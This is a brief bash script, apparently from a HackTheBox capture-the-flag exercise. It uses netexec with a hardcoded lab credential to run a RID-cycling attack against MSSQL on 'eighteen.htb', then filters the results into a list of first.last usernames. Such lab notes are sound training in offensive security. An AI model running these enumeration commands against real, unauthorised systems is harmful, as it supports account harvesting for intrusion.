#! /bin/bash

# Windows RID cycle attack through MSSQL
netexec mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute


#  Filter usernames with structure <first>.<last> and grab them into a file
netexec mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute | grep -oP 'EIGHTEEN\\\w+\.\w+' | cut -d '\' -f2 | tee users

